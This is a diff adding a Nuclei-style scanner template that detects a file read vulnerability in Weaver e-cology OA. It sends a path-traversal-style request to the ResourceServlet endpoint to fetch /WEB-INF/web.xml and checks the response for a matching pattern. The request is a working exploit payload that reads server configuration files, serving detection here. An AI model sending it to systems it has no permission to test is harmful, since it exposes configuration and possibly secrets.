@@ -1,0 +1,21 @@
+id: weaver_e_cology_oa-readfile-CT-158983
+info:
+  name: Weaver e-cology OA File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Detects a file read vulnerability in Weaver e-cology OA via the 'ResourceServlet' endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<url-pattern>/weaver/"
